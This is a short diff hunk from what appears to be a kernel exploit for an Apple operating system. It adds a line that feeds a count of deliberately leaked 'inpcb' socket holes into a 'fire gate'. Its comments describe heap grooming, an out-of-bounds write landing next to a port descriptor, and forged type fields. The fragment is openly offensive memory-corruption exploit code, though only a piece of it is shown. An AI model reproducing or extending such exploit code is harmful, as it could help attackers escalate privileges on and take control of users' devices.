@@ -654,6 +654,9 @@ static NSURL *p073_model_url(NSString *name) {
         }
         p073_log(@"[v7h] inpcb band %u/%u sockets held LIVE (fd leaks intentional)",
                  g_p073_inpcbN, P073_N_HOLES);
+        nHoles = g_p073_inpcbN;   /* v7h fix: feed the fire gate; holes[] ports
+                                     stay NULL so recv scans skip them —
+                                     the victims are the inpcbs, not kmsgs */
     }
     /* v8: holes are PORTKIND descriptor kmsgs - the fill's record OOB lands
        NEXT to (or over) a PORT DESCRIPTOR by construction; forged type@8 +
